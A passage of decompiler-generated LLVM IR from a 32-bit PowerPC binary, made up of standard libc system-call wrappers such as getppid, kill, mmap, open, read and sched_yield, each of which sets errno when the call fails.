  uselistorder label %dec_label_pc_10018cf4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018d20 = call i32 @__asm_mfcr()
  %v1_10018d24 = and i32 %v0_10018d20, 268435456
  %v3_10018d24 = icmp eq i32 %v1_10018d24, 0
  store i32 %v0_10018d20, i32* %r31.global-to-local, align 4
  br i1 %v3_10018d24, label %dec_label_pc_10018d3c, label %dec_label_pc_10018d30

dec_label_pc_10018d30:                            ; preds = %entry
  %v0_10018d30 = call i32 @__errno_location()
  %v0_10018d34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018d34 = inttoptr i32 %v0_10018d30 to i32*
  store i32 %v0_10018d34, i32* %v2_10018d34, align 4
  br label %dec_label_pc_10018d3c

dec_label_pc_10018d3c:                            ; preds = %entry, %dec_label_pc_10018d30
  %v0_10018d4c = phi i32 [ %v0_10018d20, %entry ], [ -1, %dec_label_pc_10018d30 ]
  ret i32 %v0_10018d4c

; uselistorder directives
  uselistorder label %dec_label_pc_10018d3c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018d68 = call i32 @__asm_mfcr()
  %v1_10018d6c = and i32 %v0_10018d68, 268435456
  %v3_10018d6c = icmp eq i32 %v1_10018d6c, 0
  store i32 %v0_10018d68, i32* %r31.global-to-local, align 4
  br i1 %v3_10018d6c, label %dec_label_pc_10018d84, label %dec_label_pc_10018d78

dec_label_pc_10018d78:                            ; preds = %entry
  %v0_10018d78 = call i32 @__errno_location()
  %v0_10018d7c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018d7c = inttoptr i32 %v0_10018d78 to i32*
  store i32 %v0_10018d7c, i32* %v2_10018d7c, align 4
  br label %dec_label_pc_10018d84

dec_label_pc_10018d84:                            ; preds = %entry, %dec_label_pc_10018d78
  %v0_10018d94 = phi i32 [ %v0_10018d68, %entry ], [ -1, %dec_label_pc_10018d78 ]
  ret i32 %v0_10018d94

; uselistorder directives
  uselistorder label %dec_label_pc_10018d84, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018db0 = call i32 @__asm_mfcr()
  %v1_10018db4 = and i32 %v0_10018db0, 268435456
  %v3_10018db4 = icmp eq i32 %v1_10018db4, 0
  store i32 %v0_10018db0, i32* %r31.global-to-local, align 4
  br i1 %v3_10018db4, label %dec_label_pc_10018dcc, label %dec_label_pc_10018dc0

dec_label_pc_10018dc0:                            ; preds = %entry
  %v0_10018dc0 = call i32 @__errno_location()
  %v0_10018dc4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018dc4 = inttoptr i32 %v0_10018dc0 to i32*
  store i32 %v0_10018dc4, i32* %v2_10018dc4, align 4
  br label %dec_label_pc_10018dcc

dec_label_pc_10018dcc:                            ; preds = %entry, %dec_label_pc_10018dc0
  %v0_10018ddc = phi i32 [ %v0_10018db0, %entry ], [ -1, %dec_label_pc_10018dc0 ]
  ret i32 %v0_10018ddc

; uselistorder directives
  uselistorder label %dec_label_pc_10018dcc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018df8 = call i32 @__asm_mfcr()
  %v1_10018dfc = and i32 %v0_10018df8, 268435456
  store i32 %v1_10018dfc, i32* @r9, align 4
  %v3_10018dfc = icmp eq i32 %v1_10018dfc, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10018df8, i32* %r31.global-to-local, align 4
  br i1 %v3_10018dfc, label %dec_label_pc_10018e14, label %dec_label_pc_10018e08

dec_label_pc_10018e08:                            ; preds = %entry
  %v0_10018e08 = call i32 @__errno_location()
  %v0_10018e0c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018e0c = inttoptr i32 %v0_10018e08 to i32*
  store i32 %v0_10018e0c, i32* %v2_10018e0c, align 4
  br label %dec_label_pc_10018e14

dec_label_pc_10018e14:                            ; preds = %entry, %dec_label_pc_10018e08
  %v0_10018e24 = phi i32 [ %v0_10018df8, %entry ], [ -1, %dec_label_pc_10018e08 ]
  ret i32 %v0_10018e24

; uselistorder directives
  uselistorder label %dec_label_pc_10018e14, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10018e28 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r10, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10018e54 = call i32 @__asm_mfcr()
  %v1_10018e58 = and i32 %v0_10018e54, 268435456
  %v3_10018e58 = icmp eq i32 %v1_10018e58, 0
  store i32 %v0_10018e54, i32* %r31.global-to-local, align 4
  store i32 %v0_10018e54, i32* %r0.global-to-local, align 4
  br i1 %v3_10018e58, label %dec_label_pc_10018e7c, label %dec_label_pc_10018e6c

dec_label_pc_10018e6c:                            ; preds = %entry
  %v0_10018e6c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10018e74 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018e74 = inttoptr i32 %v0_10018e6c to i32*
  store i32 %v0_10018e74, i32* %v2_10018e74, align 4
  %v0_10018e80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10018e80

dec_label_pc_10018e7c:                            ; preds = %entry
  %v3_10018e64 = icmp eq i32 %v0_10018e54, 0
  br i1 %v3_10018e64, label %dec_label_pc_10018e8c, label %dec_label_pc_10018e80

dec_label_pc_10018e80:                            ; preds = %dec_label_pc_10018e7c, %dec_label_pc_10018e6c
  %v0_10018e80 = phi i32 [ %v0_10018e54, %dec_label_pc_10018e7c ], [ %v0_10018e80.pre, %dec_label_pc_10018e6c ]
  store i32 %v0_10018e80, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_10018e80, 0
  %v1_10018e84 = zext i1 %tmp to i32
  %v2_10018e84 = ashr i32 %v0_10018e80, 31
  %v3_10018e84 = and i32 %v2_10018e84, -2
  %v4_10018e84 = or i32 %v3_10018e84, %v1_10018e84
  br label %dec_label_pc_10018e94

dec_label_pc_10018e8c:                            ; preds = %dec_label_pc_10018e7c
  %v3_10018e8c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10018e94

dec_label_pc_10018e94:                            ; preds = %dec_label_pc_10018e80, %dec_label_pc_10018e8c
  %v0_10018ea4 = phi i32 [ %v4_10018e84, %dec_label_pc_10018e80 ], [ %v3_10018e8c, %dec_label_pc_10018e8c ]
  store i32 %v0_10018e28, i32* %r0.global-to-local, align 4
  ret i32 %v0_10018ea4

; uselistorder directives
  uselistorder i32 %v0_10018e80, { 2, 0, 1 }
  uselistorder i32 %v0_10018e54, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10018e94, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  %v1_10018ec0 = add i32 %arg1, 448
  %v2_10018ec0 = inttoptr i32 %v1_10018ec0 to i32*
  %v3_10018ec0 = load i32, i32* %v2_10018ec0, align 4
  %v3_10018ec4 = icmp eq i32 %v3_10018ec0, 0
  br i1 %v3_10018ec4, label %dec_label_pc_10018edc, label %dec_label_pc_10018ecc

dec_label_pc_10018ecc:                            ; preds = %entry
  %v1_10018ed0 = add i32 %arg1, 452
  store i32 268537564, i32* @lr, align 4
  %v3_10018ed8 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10018ed0, i32 0)
  %v0_10018edc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018edc

dec_label_pc_10018edc:                            ; preds = %entry, %dec_label_pc_10018ecc
  %v0_10018edc = phi i32 [ %arg2, %entry ], [ %v0_10018edc.pre, %dec_label_pc_10018ecc ]
  %v3_10018edc = icmp eq i32 %v0_10018edc, 0
  br i1 %v3_10018edc, label %dec_label_pc_10018ee4, label %dec_label_pc_10018ee8

dec_label_pc_10018ee4:                            ; preds = %dec_label_pc_10018edc
  br label %dec_label_pc_10018ee8

dec_label_pc_10018ee8:                            ; preds = %dec_label_pc_10018edc, %dec_label_pc_10018ee4
  %v0_10018eec = phi i32 [ %v0_10018edc, %dec_label_pc_10018edc ], [ 1, %dec_label_pc_10018ee4 ]
  %v0_10018ee8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10018ef0 = inttoptr i32 %v0_10018ee8 to i32*
  %v3_10018ef0 = call i32 @__longjmp(i32* %v2_10018ef0, i32 %v0_10018eec)
  ret i32 %v3_10018ef0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10018ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10018edc, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f0c = call i32 @__asm_mfcr()
  %v1_10018f10 = and i32 %v0_10018f0c, 268435456
  %v3_10018f10 = icmp eq i32 %v1_10018f10, 0
  store i32 %v0_10018f0c, i32* %r31.global-to-local, align 4
  br i1 %v3_10018f10, label %dec_label_pc_10018f28, label %dec_label_pc_10018f1c

dec_label_pc_10018f1c:                            ; preds = %entry
  %v0_10018f1c = call i32 @__errno_location()
  %v0_10018f20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018f20 = inttoptr i32 %v0_10018f1c to i32*
  store i32 %v0_10018f20, i32* %v2_10018f20, align 4
  br label %dec_label_pc_10018f28

dec_label_pc_10018f28:                            ; preds = %entry, %dec_label_pc_10018f1c
  %v0_10018f38 = phi i32 [ %v0_10018f0c, %entry ], [ -1, %dec_label_pc_10018f1c ]
  ret i32 %v0_10018f38

; uselistorder directives
  uselistorder label %dec_label_pc_10018f28, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f54 = call i32 @__asm_mfcr()
  %v1_10018f58 = and i32 %v0_10018f54, 268435456
  %v3_10018f58 = icmp eq i32 %v1_10018f58, 0
  store i32 %v0_10018f54, i32* %r31.global-to-local, align 4
  br i1 %v3_10018f58, label %dec_label_pc_10018f70, label %dec_label_pc_10018f64

dec_label_pc_10018f64:                            ; preds = %entry
  %v0_10018f64 = call i32 @__errno_location()
  %v0_10018f68 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018f68 = inttoptr i32 %v0_10018f64 to i32*
  store i32 %v0_10018f68, i32* %v2_10018f68, align 4
  br label %dec_label_pc_10018f70

dec_label_pc_10018f70:                            ; preds = %entry, %dec_label_pc_10018f64
  %v0_10018f80 = phi i32 [ %v0_10018f54, %entry ], [ -1, %dec_label_pc_10018f64 ]
  ret i32 %v0_10018f80

; uselistorder directives
  uselistorder label %dec_label_pc_10018f70, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f9c = call i32 @__asm_mfcr()
  %v1_10018fa0 = and i32 %v0_10018f9c, 268435456
  %v3_10018fa0 = icmp eq i32 %v1_10018fa0, 0
  store i32 %v0_10018f9c, i32* %r31.global-to-local, align 4
  br i1 %v3_10018fa0, label %dec_label_pc_10018fb8, label %dec_label_pc_10018fac

dec_label_pc_10018fac:                            ; preds = %entry
  %v0_10018fac = call i32 @__errno_location()
  %v0_10018fb0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018fb0 = inttoptr i32 %v0_10018fac to i32*
  store i32 %v0_10018fb0, i32* %v2_10018fb0, align 4
  br label %dec_label_pc_10018fb8

dec_label_pc_10018fb8:                            ; preds = %entry, %dec_label_pc_10018fac
  %v0_10018fc8 = phi i32 [ %v0_10018f9c, %entry ], [ -1, %dec_label_pc_10018fac ]
  ret i32 %v0_10018fc8

; uselistorder directives
  uselistorder label %dec_label_pc_10018fb8, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018fe4 = call i32 @__asm_mfcr()
  %v1_10018fe8 = and i32 %v0_10018fe4, 268435456
  %v3_10018fe8 = icmp eq i32 %v1_10018fe8, 0
  store i32 %v0_10018fe4, i32* %r31.global-to-local, align 4
  br i1 %v3_10018fe8, label %dec_label_pc_10019000, label %dec_label_pc_10018ff4

dec_label_pc_10018ff4:                            ; preds = %entry
  %v0_10018ff4 = call i32 @__errno_location()
  %v0_10018ff8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018ff8 = inttoptr i32 %v0_10018ff4 to i32*
  store i32 %v0_10018ff8, i32* %v2_10018ff8, align 4
  br label %dec_label_pc_10019000

dec_label_pc_10019000:                            ; preds = %entry, %dec_label_pc_10018ff4
  %v0_10019010 = phi i32 [ %v0_10018fe4, %entry ], [ -1, %dec_label_pc_10018ff4 ]
  ret i32 %v0_10019010

; uselistorder directives
  uselistorder label %dec_label_pc_10019000, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001902c = call i32 @__asm_mfcr()
  %v1_10019030 = and i32 %v0_1001902c, 268435456
  %v3_10019030 = icmp eq i32 %v1_10019030, 0
  store i32 %v0_1001902c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019030, label %dec_label_pc_10019048, label %dec_label_pc_1001903c

dec_label_pc_1001903c:                            ; preds = %entry
  %v0_1001903c = call i32 @__errno_location()
  %v0_10019040 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019040 = inttoptr i32 %v0_1001903c to i32*
  store i32 %v0_10019040, i32* %v2_10019040, align 4
  br label %dec_label_pc_10019048

dec_label_pc_10019048:                            ; preds = %entry, %dec_label_pc_1001903c
  %v0_10019058 = phi i32 [ %v0_1001902c, %entry ], [ -1, %dec_label_pc_1001903c ]
  ret i32 %v0_10019058

; uselistorder directives
  uselistorder label %dec_label_pc_10019048, { 1, 0 }
}

define i32 @__libc_nanosleep() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019074 = call i32 @__asm_mfcr()
  %v1_10019078 = and i32 %v0_10019074, 268435456
  %v3_10019078 = icmp eq i32 %v1_10019078, 0
  store i32 %v0_10019074, i32* %r31.global-to-local, align 4
  br i1 %v3_10019078, label %dec_label_pc_10019090, label %dec_label_pc_10019084

dec_label_pc_10019084:                            ; preds = %entry
  %v0_10019084 = call i32 @__errno_location()
  %v0_10019088 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019088 = inttoptr i32 %v0_10019084 to i32*
  store i32 %v0_10019088, i32* %v2_10019088, align 4
  br label %dec_label_pc_10019090

dec_label_pc_10019090:                            ; preds = %entry, %dec_label_pc_10019084
  %v0_100190a0 = phi i32 [ %v0_10019074, %entry ], [ -1, %dec_label_pc_10019084 ]
  ret i32 %v0_100190a0

; uselistorder directives
  uselistorder label %dec_label_pc_10019090, { 1, 0 }
}

define i32 @__libc_open() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_100190b8 = load i32, i32* @r4, align 4
  %v1_100190b8 = and i32 %v0_100190b8, 64
  %v3_100190b8 = icmp eq i32 %v1_100190b8, 0
  br i1 %v3_100190b8, label %dec_label_pc_100190e4, label %dec_label_pc_100190c8

dec_label_pc_100190c8:                            ; preds = %entry
  %v2_100190d0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100190d0, i32* %stack_var_-32, align 4
  %v0_100190e0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_100190e4

dec_label_pc_100190e4:                            ; preds = %entry, %dec_label_pc_100190c8
  %v0_100190e4 = phi i32 [ 0, %entry ], [ %v0_100190e0, %dec_label_pc_100190c8 ]
  store i32 %v0_100190e4, i32* @r5, align 4
  %v0_100190ec = call i32 @__asm_mfcr()
  %v1_100190f0 = and i32 %v0_100190ec, 268435456
  %v3_100190f0 = icmp eq i32 %v1_100190f0, 0
  store i32 %v0_100190ec, i32* %r31.global-to-local, align 4
  br i1 %v3_100190f0, label %dec_label_pc_10019108, label %dec_label_pc_100190fc

dec_label_pc_100190fc:                            ; preds = %dec_label_pc_100190e4
  %v0_100190fc = call i32 @__errno_location()
  %v0_10019100 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019100 = inttoptr i32 %v0_100190fc to i32*
  store i32 %v0_10019100, i32* %v2_10019100, align 4
  br label %dec_label_pc_10019108

dec_label_pc_10019108:                            ; preds = %dec_label_pc_100190e4, %dec_label_pc_100190fc
  %v0_10019118 = phi i32 [ %v0_100190ec, %dec_label_pc_100190e4 ], [ -1, %dec_label_pc_100190fc ]
  ret i32 %v0_10019118

; uselistorder directives
  uselistorder label %dec_label_pc_10019108, { 1, 0 }
  uselistorder label %dec_label_pc_100190e4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 577, i32* @r4, align 4
  %v0_10019128 = call i32 @__libc_open()
  ret i32 %v0_10019128
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v1_1001913c = and i32 %arg1, 64
  %v3_1001913c = icmp eq i32 %v1_1001913c, 0
  %v1_10019140 = or i32 %arg1, 65536
  store i32 %v1_10019140, i32* @r4, align 4
  br i1 %v3_1001913c, label %dec_label_pc_10019168, label %dec_label_pc_1001914c

dec_label_pc_1001914c:                            ; preds = %entry
  %v2_10019154 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_10019154, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10019168

dec_label_pc_10019168:                            ; preds = %entry, %dec_label_pc_1001914c
  %v0_10019168 = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_1001914c ]
  store i32 %v0_10019168, i32* @r5, align 4
  store i32 268538228, i32* @lr, align 4
  %v0_10019170 = call i32 @__libc_open()
  ret i32 %v0_10019170

; uselistorder directives
  uselistorder label %dec_label_pc_10019168, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001919c = call i32 @__asm_mfcr()
  %v1_100191a0 = and i32 %v0_1001919c, 268435456
  %v3_100191a0 = icmp eq i32 %v1_100191a0, 0
  store i32 %v0_1001919c, i32* %r31.global-to-local, align 4
  br i1 %v3_100191a0, label %dec_label_pc_100191b8, label %dec_label_pc_100191ac

dec_label_pc_100191ac:                            ; preds = %entry
  %v0_100191ac = call i32 @__errno_location()
  %v0_100191b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100191b0 = inttoptr i32 %v0_100191ac to i32*
  store i32 %v0_100191b0, i32* %v2_100191b0, align 4
  br label %dec_label_pc_100191b8

dec_label_pc_100191b8:                            ; preds = %entry, %dec_label_pc_100191ac
  %v0_100191c8 = phi i32 [ %v0_1001919c, %entry ], [ -1, %dec_label_pc_100191ac ]
  ret i32 %v0_100191c8

; uselistorder directives
  uselistorder label %dec_label_pc_100191b8, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100191e4 = call i32 @__asm_mfcr()
  %v1_100191e8 = and i32 %v0_100191e4, 268435456
  %v3_100191e8 = icmp eq i32 %v1_100191e8, 0
  store i32 %v0_100191e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100191e8, label %dec_label_pc_10019200, label %dec_label_pc_100191f4

dec_label_pc_100191f4:                            ; preds = %entry
  %v0_100191f4 = call i32 @__errno_location()
  %v0_100191f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100191f8 = inttoptr i32 %v0_100191f4 to i32*
  store i32 %v0_100191f8, i32* %v2_100191f8, align 4
  br label %dec_label_pc_10019200

dec_label_pc_10019200:                            ; preds = %entry, %dec_label_pc_100191f4
  %v0_10019210 = phi i32 [ %v0_100191e4, %entry ], [ -1, %dec_label_pc_100191f4 ]
  ret i32 %v0_10019210

; uselistorder directives
  uselistorder label %dec_label_pc_10019200, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001922c = call i32 @__asm_mfcr()
  %v1_10019230 = and i32 %v0_1001922c, 268435456
  %v3_10019230 = icmp eq i32 %v1_10019230, 0
  store i32 %v0_1001922c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019230, label %dec_label_pc_10019248, label %dec_label_pc_1001923c

dec_label_pc_1001923c:                            ; preds = %entry
  %v0_1001923c = call i32 @__errno_location()
  %v0_10019240 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019240 = inttoptr i32 %v0_1001923c to i32*
  store i32 %v0_10019240, i32* %v2_10019240, align 4
  br label %dec_label_pc_10019248

dec_label_pc_10019248:                            ; preds = %entry, %dec_label_pc_1001923c
  %v0_10019258 = phi i32 [ %v0_1001922c, %entry ], [ -1, %dec_label_pc_1001923c ]
  ret i32 %v0_10019258

; uselistorder directives
  uselistorder label %dec_label_pc_10019248, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019274 = call i32 @__asm_mfcr()
  %v1_10019278 = and i32 %v0_10019274, 268435456
  %v3_10019278 = icmp eq i32 %v1_10019278, 0
  store i32 %v0_10019274, i32* %r31.global-to-local, align 4
  br i1 %v3_10019278, label %dec_label_pc_10019290, label %dec_label_pc_10019284

dec_label_pc_10019284:                            ; preds = %entry
  %v0_10019284 = call i32 @__errno_location()
  %v0_10019288 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019288 = inttoptr i32 %v0_10019284 to i32*
  store i32 %v0_10019288, i32* %v2_10019288, align 4
  br label %dec_label_pc_10019290

dec_label_pc_10019290:                            ; preds = %entry, %dec_label_pc_10019284
  %v0_100192a0 = phi i32 [ %v0_10019274, %entry ], [ -1, %dec_label_pc_10019284 ]
  ret i32 %v0_100192a0

; uselistorder directives
  uselistorder label %dec_label_pc_10019290, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100192bc = call i32 @__asm_mfcr()
  %v1_100192c0 = and i32 %v0_100192bc, 268435456
  %v3_100192c0 = icmp eq i32 %v1_100192c0, 0
  store i32 %v0_100192bc, i32* %r31.global-to-local, align 4
  br i1 %v3_100192c0, label %dec_label_pc_100192d8, label %dec_label_pc_100192cc

dec_label_pc_100192cc:                            ; preds = %entry
  %v0_100192cc = call i32 @__errno_location()
  %v0_100192d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100192d0 = inttoptr i32 %v0_100192cc to i32*
  store i32 %v0_100192d0, i32* %v2_100192d0, align 4
  br label %dec_label_pc_100192d8

dec_label_pc_100192d8:                            ; preds = %entry, %dec_label_pc_100192cc
  %v0_100192e8 = phi i32 [ %v0_100192bc, %entry ], [ -1, %dec_label_pc_100192cc ]
  ret i32 %v0_100192e8

; uselistorder directives
  uselistorder label %dec_label_pc_100192d8, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019304 = call i32 @__asm_mfcr()
  %v1_10019308 = and i32 %v0_10019304, 268435456
  %v3_10019308 = icmp eq i32 %v1_10019308, 0
  store i32 %v0_10019304, i32* %r31.global-to-local, align 4
  br i1 %v3_10019308, label %dec_label_pc_10019320, label %dec_label_pc_10019314

dec_label_pc_10019314:                            ; preds = %entry
  %v0_10019314 = call i32 @__errno_location()
  %v0_10019318 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019318 = inttoptr i32 %v0_10019314 to i32*
  store i32 %v0_10019318, i32* %v2_10019318, align 4
  br label %dec_label_pc_10019320

dec_label_pc_10019320:                            ; preds = %entry, %dec_label_pc_10019314
  %v0_10019330 = phi i32 [ %v0_10019304, %entry ], [ -1, %dec_label_pc_10019314 ]
  ret i32 %v0_10019330

; uselistorder directives
  uselistorder label %dec_label_pc_10019320, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001934c = call i32 @__asm_mfcr()
  %v1_10019350 = and i32 %v0_1001934c, 268435456
  %v3_10019350 = icmp eq i32 %v1_10019350, 0
  store i32 %v0_1001934c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019350, label %dec_label_pc_10019368, label %dec_label_pc_1001935c

dec_label_pc_1001935c:                            ; preds = %entry
  %v0_1001935c = call i32 @__errno_location()
  %v0_10019360 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019360 = inttoptr i32 %v0_1001935c to i32*
  store i32 %v0_10019360, i32* %v2_10019360, align 4
  br label %dec_label_pc_10019368

dec_label_pc_10019368:                            ; preds = %entry, %dec_label_pc_1001935c
  %v0_10019378 = phi i32 [ %v0_1001934c, %entry ], [ -1, %dec_label_pc_1001935c ]
  ret i32 %v0_10019378

; uselistorder directives
  uselistorder label %dec_label_pc_10019368, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019394 = call i32 @__asm_mfcr()
  %v1_10019398 = and i32 %v0_10019394, 268435456
  %v3_10019398 = icmp eq i32 %v1_10019398, 0
  store i32 %v0_10019394, i32* %r31.global-to-local, align 4
  br i1 %v3_10019398, label %dec_label_pc_100193b0, label %dec_label_pc_100193a4

dec_label_pc_100193a4:                            ; preds = %entry
  %v0_100193a4 = call i32 @__errno_location()
  %v0_100193a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100193a8 = inttoptr i32 %v0_100193a4 to i32*
  store i32 %v0_100193a8, i32* %v2_100193a8, align 4
  br label %dec_label_pc_100193b0

dec_label_pc_100193b0:                            ; preds = %entry, %dec_label_pc_100193a4
  %v0_100193c0 = phi i32 [ %v0_10019394, %entry ], [ -1, %dec_label_pc_100193a4 ]
  ret i32 %v0_100193c0

; uselistorder directives
  uselistorder label %dec_label_pc_100193b0, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100193dc = call i32 @__asm_mfcr()
  %v1_100193e0 = and i32 %v0_100193dc, 268435456
  %v3_100193e0 = icmp eq i32 %v1_100193e0, 0
  store i32 %v0_100193dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100193e0, label %dec_label_pc_100193f8, label %dec_label_pc_100193ec

dec_label_pc_100193ec:                            ; preds = %entry
  %v0_100193ec = call i32 @__errno_location()
  %v0_100193f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100193f0 = inttoptr i32 %v0_100193ec to i32*
  store i32 %v0_100193f0, i32* %v2_100193f0, align 4
  br label %dec_label_pc_100193f8

dec_label_pc_100193f8:                            ; preds = %entry, %dec_label_pc_100193ec
  %v0_10019408 = phi i32 [ %v0_100193dc, %entry ], [ -1, %dec_label_pc_100193ec ]
  ret i32 %v0_10019408

; uselistorder directives
  uselistorder label %dec_label_pc_100193f8, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019424 = call i32 @__asm_mfcr()
  %v1_10019428 = and i32 %v0_10019424, 268435456
  %v3_10019428 = icmp eq i32 %v1_10019428, 0
  store i32 %v0_10019424, i32* %r31.global-to-local, align 4
  br i1 %v3_10019428, label %dec_label_pc_10019440, label %dec_label_pc_10019434

dec_label_pc_10019434:                            ; preds = %entry
  %v0_10019434 = call i32 @__errno_location()
  %v0_10019438 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019438 = inttoptr i32 %v0_10019434 to i32*
  store i32 %v0_10019438, i32* %v2_10019438, align 4
  br label %dec_label_pc_10019440

dec_label_pc_10019440:                            ; preds = %entry, %dec_label_pc_10019434
  %v0_10019450 = phi i32 [ %v0_10019424, %entry ], [ -1, %dec_label_pc_10019434 ]
  ret i32 %v0_10019450

; uselistorder directives
  uselistorder label %dec_label_pc_10019440, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001946c = call i32 @__asm_mfcr()
  %v1_10019470 = and i32 %v0_1001946c, 268435456
  %v3_10019470 = icmp eq i32 %v1_10019470, 0
  store i32 %v0_1001946c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019470, label %dec_label_pc_10019488, label %dec_label_pc_1001947c

dec_label_pc_1001947c:                            ; preds = %entry
  %v0_1001947c = call i32 @__errno_location()
  %v0_10019480 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019480 = inttoptr i32 %v0_1001947c to i32*
  store i32 %v0_10019480, i32* %v2_10019480, align 4
  br label %dec_label_pc_10019488

